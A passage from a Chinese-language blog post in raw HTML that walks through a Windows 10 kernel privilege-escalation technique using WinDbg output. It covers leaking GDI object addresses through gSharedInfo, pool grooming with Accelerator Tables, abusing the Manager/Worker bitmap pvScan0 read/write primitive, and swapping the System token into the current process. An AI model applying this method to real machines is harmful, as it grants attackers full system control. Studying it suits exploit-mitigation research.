kd&gt;&nbsp;dt&nbsp;win32k!tagSHAREDINFO&nbsp;&nbsp;//由于调试时tagSHAREDINFO不透明，这里只能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
//从网上拷贝一个方便说明
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;+0x000&nbsp;psi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;tagSERVERINFO
+0x008&nbsp;aheList&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;_HANDLEENTRY
kd&gt;&nbsp;dq&nbsp;7ffd43cdc680+0x8&nbsp;L1&nbsp;//+0x8位置的HANDLEENTRY就是我们要的表
00007ffd`43cdc688&nbsp;&nbsp;00000000`011e0000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这样就能得到句柄实际内核地址的表了，也就是指向GDI对象的表，这里就要计算对应的偏移了，计算方法其实和之前GdiSharedHandleTable很像，那个算对应GDICELL64地址的计算方法是：</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">GdiSharedHandleTable+(handle &amp; 0xffff)*sizeof(GDICELL64)</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这里就用_HANDLETABLE_ENTRY + (Accel &amp; 0xffff)*sizeof（Accel）算出地址，这里Accel的值是：</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;r&nbsp;eax
eax=1700b9
kd&gt;&nbsp;p
0033:00007ff6`956112d1&nbsp;488d1449&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,[rcx+rcx*2]//计算handle的值
kd&gt;&nbsp;p
0033:00007ff6`956112d5&nbsp;488bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rax
kd&gt;&nbsp;r&nbsp;rdx
rdx=000000000000022b//&nbsp;handle的值为22b
kd&gt;&nbsp;dd&nbsp;11e0000+22b*8&nbsp;L1&nbsp;//&nbsp;11e0000是刚才获得的HANDLENTRY，计算出偏移
&nbsp;//&nbsp;指向的就是GDI对象
00000000`011e1158&nbsp;&nbsp;81be7000&nbsp;ffffbad3</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">紧接着调用DestroyAcceleratorTable释放这个加速键表，可以看到对应句柄内核指针的值也被释放了。注意这里申请的Accelerator Table的大小是700，同样如果制造出一个稳定的hole之后，申请bitmap的大小也是700。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
0033:00007ff6`956112d8&nbsp;488b5cd500&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbx,qword&nbsp;ptr&nbsp;[rbp+rdx*8]
kd&gt;&nbsp;p
0033:00007ff6`956112dd&nbsp;ff15451f0000&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[00007ff6`95613228]
kd&gt;&nbsp;p
0033:00007ff6`956112e3&nbsp;babc020000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,2BCh
kd&gt;&nbsp;dd&nbsp;11e0000+22b*8//&nbsp;对应索引的位置GDI对象被释放
00000000`011e1158&nbsp;&nbsp;0000042f&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">可以看到，对应位置存放的GDI对象也释放掉了，再次通过Create申请Accelerator Table。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">0033:00007ff6`956112eb&nbsp;ff152f1f0000&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[00007ff6`95613220]
kd&gt;&nbsp;p//返回值eax
0033:00007ff6`956112f1&nbsp;0fb7c8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;movzx&nbsp;&nbsp;&nbsp;ecx,ax
kd&gt;&nbsp;r&nbsp;rax
rax=00000000001800b9
kd&gt;&nbsp;p
0033:00007ff6`956112f4&nbsp;488d1449&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rdx,[rcx+rcx*2]
kd&gt;&nbsp;p
0033:00007ff6`956112f8&nbsp;488bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rax
kd&gt;&nbsp;r&nbsp;rdx//计算获得handle，和上一次申请的handle值一样
rdx=000000000000022b
kd&gt;&nbsp;dd&nbsp;11e0000+22b*8//查看pkernelAddress
00000000`011e1158&nbsp;&nbsp;81be7000&nbsp;ffffbad3
kd&gt;&nbsp;dd&nbsp;ffffbad381be7000&nbsp;l90//对应位置存放的值，+0x0位置就是phead
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//GdiSharedHandleTable被fix，可以用这个方法
ffffbad3`81be7000&nbsp;&nbsp;001800b9&nbsp;00000000&nbsp;00000000&nbsp;00000000
ffffbad3`81be7010&nbsp;&nbsp;00000000&nbsp;00000000&nbsp;000002bc&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">句柄虽然改变但是对应索引位置在shared info handle entry的值仍然是相同的，这样，再次在相同位置申请bitmap，首先释放，来看下pkernelAddress的值：</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
0033:00007ff6`95611311&nbsp;ff15111f0000&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[00007ff6`95613228]
kd&gt;&nbsp;p
0033:00007ff6`95611317&nbsp;33c9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,ecx
kd&gt;&nbsp;dd&nbsp;ffffbad381be7000//查看GDI对象的内容也被释放
ffffbad3`81be7000&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????
ffffbad3`81be7010&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????
ffffbad3`81be7020&nbsp;&nbsp;????????&nbsp;????????&nbsp;????????&nbsp;????????</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">指向的空间也被释放了，随后通过CreateBitmap申请bitmap，大小同样是700，来占用Accelerator制造的稳定内存空洞。调用CreateBitmap之后占用了内存空洞。这样，我们直接找到ffffbad381be7000这个GDI对象。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p//调用CreateBitmap创建Bitmap
0033:00007ff6`95611345&nbsp;ff15dd1c0000&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[00007ff6`95613028]
kd&gt;&nbsp;p//创建成功返回
0033:00007ff6`9561134b&nbsp;488906&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[rsi],rax
kd&gt;&nbsp;dd&nbsp;ffffbad381be7000//查看原来Accelerator&nbsp;Table的内核地址位置的值
ffffbad3`81be7000&nbsp;&nbsp;96050bd0&nbsp;ffffffff&nbsp;00000000&nbsp;00000000</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">可以看到，我们成功获得了Bitmap的pkernelAddress，就是0xffffffff96050bd0，这样，我们就成功在KASLR和fix GdiSharedHandleTable下，完成了bitmap pkernelAddress的获取。</span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;"><br/></span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">SetBitmap/GetBtimap和pvScan0</span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">利用gSharedInfo获取aheList，从而得到Accelerator Table在gshareInfo中的GDI对象从而获得内核地址，利用Accelerator Table制造稳定的内存空洞，最后绕过KASLR和获取Bitmap的pkernelAddress的目的就是获得pvScan0这个结构，这个是Bitmap之所以成为data attack的核心。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这里我要提一下，在调试过程中，我们需要用__asm int 3来下断点，但是在64位下VS不支持内联汇编，因此我们在项目中创建一个.asm文件，实现int 3功能，再将其编译，在项目主文件中用Int_3()来下软中断（详见我的源码），这样我们在SetBitmap下断点，首先命中GDI32!SetBitmapBitsStub：</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
GDI32!SetBitmapBitsStub+0x1c:
0033:00007fff`bd5b44ac&nbsp;488bd9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rbx,rcx
kd&gt;&nbsp;p//调用GDI32的IsTextOutAPresent&nbsp;-&gt;&nbsp;IsSetWorldTransformImplPresent函数
GDI32!SetBitmapBitsStub+0x1f:
0033:00007fff`bd5b44af&nbsp;e878b50000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;GDI32!IsTextOutAPresent&nbsp;(00007fff`bd5bfa2c)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">随后会到达call IsTextOutAPresent函数调用，这个函数在GDI32的实现是IsSetWorldTransformmImplPresent。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">char&nbsp;IsSetWorldTransformImplPresent()
{
&nbsp;&nbsp;char&nbsp;result;&nbsp;//&nbsp;al@2
&nbsp;&nbsp;char&nbsp;v1;&nbsp;//&nbsp;[sp+30h]&nbsp;[bp+8h]@5
&nbsp;
&nbsp;&nbsp;if&nbsp;(&nbsp;dword_18002E670&nbsp;==&nbsp;1&nbsp;)//dword_18002E670检查是否为1
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;dword_18002E670;
&nbsp;&nbsp;}
&nbsp;&nbsp;else&nbsp;if&nbsp;(&nbsp;dword_18002E670&nbsp;==&nbsp;2&nbsp;||&nbsp;(v1&nbsp;=&nbsp;0,&nbsp;ApiSetQueryApiSetPresence((__int64)L&quot;LN&quot;,&nbsp;(__int64)&amp;v1)&nbsp;&lt;&nbsp;0)&nbsp;)
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;0;
&nbsp;&nbsp;}
&nbsp;&nbsp;else
&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;result&nbsp;=&nbsp;v1;
&nbsp;&nbsp;&nbsp;&nbsp;dword_18002E670&nbsp;=&nbsp;2&nbsp;-&nbsp;(v1&nbsp;!=&nbsp;0);
&nbsp;&nbsp;}
&nbsp;&nbsp;return&nbsp;result;
}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这个函数主要是对dword_18002E670这个值进行判断，这个值是hmod ext ms win gdi internal desktop l1.1.0.dll+0x8位置的一个结构体变量，若为1则直接返回。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p
GDI32!IsUpdateColorsPresent+0x4://获取dll+0x8位置的值
0033:00007fff`bd5bfa30&nbsp;8b0d3aec0100&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,dword&nbsp;ptr&nbsp;[GDI32!_hmod__ext_ms_win_gdi_internal_desktop_l1_1_0_dll+0x8&nbsp;(00007fff`bd5de670)]
kd&gt;&nbsp;dd&nbsp;00007fff`bd5de670//这个位置的值为1，后面是dll函数偏移
00007fff`bd5de670&nbsp;&nbsp;00000001&nbsp;00000000&nbsp;00000000&nbsp;00000000
00007fff`bd5de680&nbsp;&nbsp;ba17ba20&nbsp;00007fff&nbsp;ba174230&nbsp;00007fff
00007fff`bd5de690&nbsp;&nbsp;ba1765d0&nbsp;00007fff&nbsp;ba1eafa0&nbsp;00007fff
kd&gt;&nbsp;p
GDI32!IsUpdateColorsPresent+0xa://将这个值和1作比较
0033:00007fff`bd5bfa36&nbsp;83f901&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ecx,1
kd&gt;&nbsp;r&nbsp;ecx
ecx=1</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">&nbsp;</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这个可能是判断ext_ms_win_gdi_internal_desktop_l1.1.0.dll的加载情况，_imp_SetBitMapBits就链在这个dll中，随后会跳转。到zwGdiSetBitmapBits中。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;p&nbsp;//调用_imp_SetBitmapBits函数
GDI32!SetBitmapBitsStub+0x30:
0033:00007fff`bd5b44c0&nbsp;ff15c2be0200&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[GDI32!_imp_SetBitmapBits&nbsp;(00007fff`bd5e0388)]
kd&gt;&nbsp;t//跳转到NtGdiSetBitmapBits
gdi32full!SetBitmapBits:
0033:00007fff`ba17bcf0&nbsp;48ff2509290900&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[gdi32full!_imp_NtGdiSetBitmapBits&nbsp;(00007fff`ba20e600)]
kd&gt;&nbsp;p
win32u!ZwGdiSetBitmapBits:
0033:00007fff`ba2d26f0&nbsp;4c8bd1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r10,rcx
//随后会进入ZwGdiSetBitmap
.text:0000000180003330&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;public&nbsp;ZwGdiSetBitmapDimension
.text:0000000180003330&nbsp;ZwGdiSetBitmapDimension&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;DATA&nbsp;XREF:&nbsp;.rdata:000000018000A544_x0019_o
.text:0000000180003330&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;.rdata:off_18000C608_x0019_o&nbsp;...
.text:0000000180003330&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r10,&nbsp;rcx
.text:0000000180003333&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;1118h
.text:0000000180003338&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;byte&nbsp;ptr&nbsp;ds:7FFE0308h,&nbsp;1
.text:0000000180003340&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_180003345
.text:0000000180003342&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;syscall
.text:0000000180003344&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;retn</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">syscall是AMD CPU下的sysenter，以此进入内核层，由于64位下没有nt!KiFastCallEntry，而改用的是nt!KiSystemCall64，在64位系统下启用了四个新的MSR寄存器，有不同的作用，其中MSR_LSTAR保存的是rip的相关信息，可以通过rdmsr c0000082的方法查看到syscall跳转地址。这个地址正是nt!KiSystemCall64的入口地址。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;rdmsr&nbsp;c0000082
msr[c0000082]&nbsp;=&nbsp;fffff801`7cb740c0
nt!KiSystemCall64:
0033:fffff801`7cb740c0&nbsp;0f01f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;swapgs
0033:fffff801`7cb740c3&nbsp;654889242510000000&nbsp;mov&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;gs:[10h],rsp</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">到此，我们进入SetBitmap的内核态，之所以pvScan0这么重要，是因为SetBitmap会对pvScan0指向的内容写数据，GetBitmap会获取pvScan0指向的内容。这样，我们可以设置一个Manager Bitmap（以下称为M）和一个Work Bitmap（以下称为W），将M的pvScan0修改成W的pvScan0地址，这样每次就能用在M上调用SetBitmap将W的pvScan0内容修改成我们想要读或者写的地址，再调用Get/Set Bitmap来向指定地址读取/写入数据了。这么说有点乱，来看一下整个过程。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">通过AcceleratorTable制造内存空洞占位获取Bitmap的pkernelAddress之后，可以获取到pvscan0的值，其中M存放W的pvscan0所存放的地址，而W的pvscan0用于最后写入相关的内容，这样我们调用setbitmapbits函数的时候，会将M的pvscan0里存放地址指向的值修改为要写入的地址。</span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">&nbsp;</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;dq&nbsp;ffffbad383ae9050&nbsp;L1&nbsp;//&nbsp;M的pvScan0，现在指向W，这样每次修改，相当&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//于修改W的pvScan0
ffffbad3`83ac8050&nbsp;&nbsp;ffffbad3`83aeb050
kd&gt;&nbsp;dq&nbsp;ffffbad383aeb050&nbsp;L1//W的pvScan0，所在地址值就是M的pvScan0值
ffffbad3`83ac8050&nbsp;&nbsp;ffffe28d`12762af0//要修改的就是这个值，向这个值的内容
//读取/写入数据</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">这里就会将ffffbad383aeb050中的值改写，因此在这里下内存写入断点。</span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;ba&nbsp;w1&nbsp;ffffbad383aeb050//向W的pvScan0下内存写入断点
kd&gt;&nbsp;p
Breakpoint&nbsp;0&nbsp;hit
win32kfull!memmove+0x1cf://中断在win32kfull!memmove函数中
ffffbab6`0b940f0f&nbsp;75ef&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jne&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;win32kfull!memmove+0x1c0&nbsp;(ffffbab6`0b940f00)
kd&gt;&nbsp;bl
&nbsp;0&nbsp;e&nbsp;ffffbad383aeb050&nbsp;w&nbsp;1&nbsp;0001&nbsp;(0001)
kd&gt;&nbsp;kb
RetAddr:ArgstoChild&nbsp;&nbsp;:&nbsp;Call&nbsp;Site
ffffbab6`0b88405c&nbsp;:&nbsp;00000000`00fff8a0&nbsp;00000000`00000000&nbsp;00000000`00000a9a&nbsp;ffffbab6`0bbbf1da&nbsp;:&nbsp;win32kfull!memmove+0x1cc
ffffbab6`0b883e1a&nbsp;:&nbsp;ffffbad3`83ae9000&nbsp;00000000`00000000&nbsp;ffffffff`00000008&nbsp;fffff801`00000704&nbsp;:&nbsp;win32kfull!bDoGetSetBitmapBits+0x168
00000000`00000000&nbsp;:&nbsp;00000000`00000000&nbsp;00000000`00000000&nbsp;00000000`00000000&nbsp;00000000`00000000&nbsp;:&nbsp;win32kfull!GreSetBitmapBits+0x17a
kd&gt;&nbsp;dq&nbsp;ffffbad383adc050&nbsp;L1&nbsp;//这里会写入新的pvScan0，这个值是当前进程的&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//token地址
ffffbad3`83aeb050&nbsp;&nbsp;ffffe28d`12762b58
kd&gt;&nbsp;!process&nbsp;0&nbsp;0&nbsp;//查看当前进程
PROCESS&nbsp;ffffe28d12762800
&nbsp;&nbsp;&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;10cc&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;011cb000&nbsp;&nbsp;ParentCid:&nbsp;1124
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;48d5b000&nbsp;&nbsp;ObjectTable:&nbsp;ffffa709d16d1640&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
Image:&nbsp;Stop_by_win10.exe
kd&gt;&nbsp;dt&nbsp;nt!_EPROCESS&nbsp;Token&nbsp;ffffe28d12762800
&nbsp;&nbsp;&nbsp;+0x358&nbsp;Token&nbsp;:&nbsp;_EX_FAST_REF
kd&gt;&nbsp;dq&nbsp;ffffe28d12762800+358&nbsp;L1//看看token值，就是pvScan0的值
ffffe28d`12762b58&nbsp;&nbsp;ffffa709`d1903996</pre><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;">在Win10中，绝大多数的win32k.sys实现都在win32full里完成，这里利用M的pvScan0完成了对W的pvScan0值的修改，使之指向了当前进程的Token，接下来只需要调用GetBitmap/SetBitmap通过W的pvScan0，就可以完成对Token的读取和修改，从而完成提权。</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;"></span></p><p style="text-indent: 0em; white-space: normal;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 0em;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;!process&nbsp;0&nbsp;4&nbsp;//获取System&nbsp;_EPROCESS结构
****&nbsp;NT&nbsp;ACTIVE&nbsp;PROCESS&nbsp;DUMP&nbsp;****
PROCESS&nbsp;ffffe28d0f662040
&nbsp;&nbsp;&nbsp;&nbsp;SessionId:&nbsp;none&nbsp;&nbsp;Cid:&nbsp;0004&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;00000000&nbsp;&nbsp;ParentCid:&nbsp;0000
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;001aa000&nbsp;&nbsp;ObjectTable:&nbsp;ffffa709c88032c0&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;System
kd&gt;&nbsp;dq&nbsp;ffffe28d0f662040+358&nbsp;L1&nbsp;//得到System&nbsp;&nbsp;Token值
ffffe28d`0f662398&nbsp;&nbsp;ffffa709`c88158ad
kd&gt;&nbsp;p//调用setBitmap将这个值写入当前进程的地址
0033:00007ff7`9dd2217f&nbsp;488bce&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rsi
kd&gt;&nbsp;g
Break&nbsp;instruction&nbsp;exception&nbsp;-&nbsp;code&nbsp;80000003&nbsp;(first&nbsp;chance)
0033:00007ff7`9dd222b0&nbsp;cc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3
kd&gt;&nbsp;!process&nbsp;//当前进程的_EPROCESS
PROCESS&nbsp;ffffe28d12cb2080
&nbsp;&nbsp;&nbsp;&nbsp;SessionId:&nbsp;1&nbsp;&nbsp;Cid:&nbsp;0b48&nbsp;&nbsp;&nbsp;&nbsp;Peb:&nbsp;0117d000&nbsp;&nbsp;ParentCid:&nbsp;1124
&nbsp;&nbsp;&nbsp;&nbsp;DirBase:&nbsp;320b6000&nbsp;&nbsp;ObjectTable:&nbsp;ffffa709d5f84500&nbsp;&nbsp;HandleCount:&nbsp;&lt;Data&nbsp;Not&nbsp;Accessible&gt;
&nbsp;&nbsp;&nbsp;&nbsp;Image:&nbsp;Stop_by_win10.exe
kd&gt;&nbsp;dq&nbsp;ffffe28d12cb2080+358&nbsp;L1&nbsp;//利用SetBitmap替换后，当前进程Token变成了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//System&nbsp;Token，提权完成
